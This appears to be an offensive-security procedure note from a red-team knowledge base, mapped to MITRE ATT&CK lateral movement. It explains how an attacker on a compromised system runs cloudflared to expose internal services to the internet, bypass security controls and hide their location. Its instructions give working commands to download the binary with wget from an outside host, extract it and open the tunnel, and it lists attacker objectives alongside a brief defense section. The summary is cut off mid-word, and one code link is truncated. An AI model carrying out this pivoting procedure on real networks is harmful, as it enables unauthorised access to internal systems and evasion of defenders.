---
id: 96385afd-bbf4-4aac-83eb-779ccab8491d
name: Cloudflare Tunnel Exposer Pivoting
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.077498+00:00'
updated_at: '2023-04-10T20:25:20.701942+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[cloudflared]]'
- '[[Network Pivoting Techniques]]'
commands:
- '[[Download Cloudflared binary]]'
- '[[Expose internal service to the internet]]'
---

# Cloudflare Tunnel Exposer Pivoting

## Summary

Cloudflare Tunnel Exposer is a tool that allows a user to expose a local web server to the internet through Cloudflare's network. This technique can be used by an attacker to pivot through a compromised network, bypassing security controls and accessing resources that are not directly accessible fr

## Description

# Description

Cloudflare Tunnel Exposer is a tool that allows a user to expose a local web server to the internet through Cloudflare's network. This technique can be used by an attacker to pivot through a compromised network, bypassing security controls and accessing resources that are not directly accessible from the internet. By using Cloudflare's network, the attacker can also hide their true location and make it more difficult for defenders to track their movements.

From a technical perspective, this technique involves installing and configuring cloudflared on the compromised system and setting up a tunnel to the attacker's system. The attacker can then access the local web server through the tunnel, as if they were on the same network. 

The business value of this technique is that it allows an attacker to access sensitive resources that are not directly accessible from the internet, such as internal web applications or databases. By using Cloudflare's network, the attacker can also hide their true location and make it more difficult for defenders to track their movements.

## Requirements

1. Access to a compromised system on the target network

1. Installation and configuration of cloudflared on the compromised system

1. Access to a web server on the compromised system

## Defense

1. Implement network segmentation to limit lateral movement through the network

1. Monitor network traffic for signs of tunneling or unusual activity

1. Implement strong authentication and access controls to limit the impact of a compromised system

## Objectives

1. Gain access to sensitive resources that are not directly accessible from the internet

1. Pivot through a compromised network

1. Hide the attacker's true location

# Instructions

1. To expose an internal service to the internet, follow these steps:
1. Download the Cloudflared binary from the provided link.
2. Extract the downloaded file using the command 'tar xvzf cloudflared-stable-linux-amd64.tgz'.
3. Run the command './cloudflared tunnel --url <protocol>://<host>:<port>', replacing <protocol>, <host>, and <port> with the appropriate values for your service. This will create a secure tunnel between your internal service and the internet.

**Code**: [[# Get the binary
wget https://bin.equinox.io/c/Vdr]]

> The 'cloudflared tunnel' command is used to create a secure tunnel between an internal service and the internet. The '--url' flag is used to specify the protocol, host, and port of the internal service. This allows the service to be accessed from the internet using the specified URL. The 'wget' command is used to download the Cloudflared binary, and the 'tar' command is used to extract the downloaded file.

**Command** ([[Download Cloudflared binary]]):

```bash
wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
tar xvzf cloudflared-stable-linux-amd64.tgz
```

**Command** ([[Expose internal service to the internet]]):

```bash
./cloudflared tunnel --url <protocol>://<host>:<port>
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[Download Cloudflared binary]]
- [[Expose internal service to the internet]]

## Tags

- [[cloudflared]]
- [[Network Pivoting Techniques]]
